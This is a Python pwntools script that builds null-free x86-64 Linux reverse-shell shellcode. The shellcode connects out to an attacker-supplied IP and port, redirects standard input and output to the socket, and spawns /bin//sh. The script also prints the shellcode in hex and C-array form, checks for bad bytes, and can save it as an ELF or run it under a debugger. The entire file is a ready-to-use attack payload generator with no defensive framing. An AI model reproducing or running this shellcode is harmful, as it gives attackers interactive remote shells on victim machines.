from pwn import *
import ctypes, struct, sys, os, socket

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]    # for command line terminal, launch tmux first before launching python code
context.log_level = 'error'

if (len(sys.argv) < 3):
  print('%s <IP> <PORT> [RUN]' % (sys.argv[0]))
  exit(1)

# define HOST & PORT here or in command line
IP, PORT = (sys.argv[1], int(sys.argv[2],10)) if len(sys.argv) > 2 else ('127.0.0.1', 12490)

def sockaddr():
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    return hex((number + (1 << 64)) % (1 << 64))

def dumpit(shellc):
  print('shellcode length: {:d} bytes'.format(len(shellc)))
  # dump as hex number array
  print('\n\"\\x{}\"'.format('\\x'.join([format(b, '02x') for b in bytearray(shellc)])))
  # dump as C array
  print("\nunsigned char shellc[] = {{{}}};".format(", ".join([format(b, '#02x') for b in bytearray(shellc)])))
  # dump as hex array
  print('\nproblematic values are highlighted (00,0a,20) check your IP,port...\n')
  print(hexdump(shellc, highlight=b'\x0a\x20\x00'))

shellc = asm ('''
socket:
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
	syscall
connect:
	xchg eax,edi
	mov al,42
        mov rcx,%s
        neg rcx
        push rcx
        push rsp
        pop rsi
        mov dl,16
        syscall
dup2:
	push 3
        pop rsi
dup2_loop:
        mov al,33
        dec esi
        syscall
        jnz dup2_loop
execve:
	cdq
	push rdx
	mov rcx, 0x68732f2f6e69622f
	push rcx
	push rsp
	pop rdi
	mov al, 59
	syscall
''' % (sockaddr()))


dumpit(shellc)

if args.EXE:
  ELF.from_bytes(shellc).save('binary')

if args.RUN:
  p = run_shellcode(shellc)
  p.interactive()
elif args.GDB:
  p = debug_shellcode(shellc, gdbscript='''
    # set your pwndbg path here
    source ~/gdb.plugins/pwndbg/gdbinit.py
    context
  ''')
  p.interactive()
  
